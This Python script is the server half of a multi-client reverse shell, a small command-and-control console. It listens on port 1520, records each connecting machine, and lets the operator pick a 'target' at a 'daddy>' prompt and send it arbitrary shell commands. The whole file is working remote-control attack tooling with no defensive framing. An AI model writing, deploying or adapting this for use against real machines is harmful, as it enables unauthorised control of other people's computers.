#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Nov 17 20:13:37 2019

@author: robert.shyroian
"""

import socket
import threading
import time
import sys
import os
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
bool_quit = True


#Create socket(allows two computers to connect)
def socket_create():
    try:
        global host#server ip adress
        global port
        global s
        host = ''
        port = 1520
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        
#Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()
        
#Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("Connection has been established: " + str(address[0]))
        except:
            print("Error accepting connections")
            
#Interactive prompt for sending commands remotely            
def start_daddy():
    while True:
        cmd = input('daddy> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'quit':
            choice = input('Do you want to quit? Y/n ')
            if choice == 'Y':
                global s
                s.close()
                os._exit(0)
                sys.stdout.flush()
                sys.exit()
            elif choice == 'n':
                continue
            else:
                print("Commend " + str(cmd) + " not recognized")
        else:
            print("Commend " + str(cmd) + " not recognized")

#Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('  '))
            conn.recv(4096)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
    print('----- Clients -----' + '\n' + results)

#Select a target client
def get_target(cmd):
    try:
        target = int(cmd.replace('select', ''))
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end = "")
        return conn
    except:
        print("Not a valid selection")
        return None

#Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(4096), 'utf-8')
                print(client_response, end = '')
                if cmd == 'quit':
                    break
        except:
            print("Connection was lost")
            break
        
#Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target = work)
        t.daemon = True
        t.start()
        
#Do the next job in the queue(one handles connections, the other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_daddy()
        queue.task_done()
            

#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
        
create_workers()   
create_jobs()

        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        